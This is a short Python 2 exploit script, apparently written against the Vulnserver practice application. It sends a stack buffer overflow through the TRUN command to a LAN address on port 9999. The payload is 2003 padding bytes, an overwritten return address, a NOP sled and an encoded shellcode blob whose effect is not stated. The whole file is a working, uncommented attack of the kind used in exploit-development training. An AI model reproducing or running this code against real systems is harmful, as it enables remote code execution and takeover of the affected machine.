#!/usr/bin/python

import socket,sys

shellcode = (
 "\xbe\xb2\xaa\x49\xd9\xd9\xc1\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x77\x12\x83\xef\xfc\x03\xc5\xa4\xab\x2c\xd5\x51\xa9"
"\xcf\x25\xa2\xce\x46\xc0\x93\xce\x3d\x81\x84\xfe\x36\xc7\x28"
"\x74\x1a\xf3\xbb\xf8\xb3\xf4\x0c\xb6\xe5\x3b\x8c\xeb\xd6\x5a"
"\x0e\xf6\x0a\xbc\x2f\x39\x5f\xbd\x68\x24\x92\xef\x21\x22\x01"
"\x1f\x45\x7e\x9a\x94\x15\x6e\x9a\x49\xed\x91\x8b\xdc\x65\xc8"
"\x0b\xdf\xaa\x60\x02\xc7\xaf\x4d\xdc\x7c\x1b\x39\xdf\x54\x55"
"\xc2\x4c\x99\x59\x31\x8c\xde\x5e\xaa\xfb\x16\x9d\x57\xfc\xed"
"\xdf\x83\x89\xf5\x78\x47\x29\xd1\x79\x84\xac\x92\x76\x61\xba"
"\xfc\x9a\x74\x6f\x77\xa6\xfd\x8e\x57\x2e\x45\xb5\x73\x6a\x1d"
"\xd4\x22\xd6\xf0\xe9\x34\xb9\xad\x4f\x3f\x54\xb9\xfd\x62\x31"
"\x0e\xcc\x9c\xc1\x18\x47\xef\xf3\x87\xf3\x67\xb8\x40\xda\x70"
"\xbf\x7a\x9a\xee\x3e\x85\xdb\x27\x85\xd1\x8b\x5f\x2c\x5a\x40"
"\x9f\xd1\x8f\xc7\xcf\x7d\x60\xa8\xbf\x3d\xd0\x40\xd5\xb1\x0f"
"\x70\xd6\x1b\x38\x1b\x2d\xcc\x87\x74\x2c\x10\x60\x87\x2e\x39"
"\x2c\x0e\xc8\x53\xdc\x46\x43\xcc\x45\xc3\x1f\x6d\x89\xd9\x5a"
"\xad\x01\xee\x9b\x60\xe2\x9b\x8f\x15\x02\xd6\xed\xb0\x1d\xcc"
"\x99\x5f\x8f\x8b\x59\x29\xac\x03\x0e\x7e\x02\x5a\xda\x92\x3d"
"\xf4\xf8\x6e\xdb\x3f\xb8\xb4\x18\xc1\x41\x38\x24\xe5\x51\x84"
"\xa5\xa1\x05\x58\xf0\x7f\xf3\x1e\xaa\x31\xad\xc8\x01\x98\x39"
"\x8c\x69\x1b\x3f\x91\xa7\xed\xdf\x20\x1e\xa8\xe0\x8d\xf6\x3c"
"\x99\xf3\x66\xc2\x70\xb0\x87\x21\x50\xcd\x2f\xfc\x31\x6c\x32"
"\xff\xec\xb3\x4b\x7c\x04\x4c\xa8\x9c\x6d\x49\xf4\x1a\x9e\x23"
"\x65\xcf\xa0\x90\x86\xda"
)

overflow = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + str(shellcode)
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.1.28',9999))
    s.send(('TRUN /.:/'+overflow))
    s.close()

except:
    print 'error connecting to server'
    sys.exit()
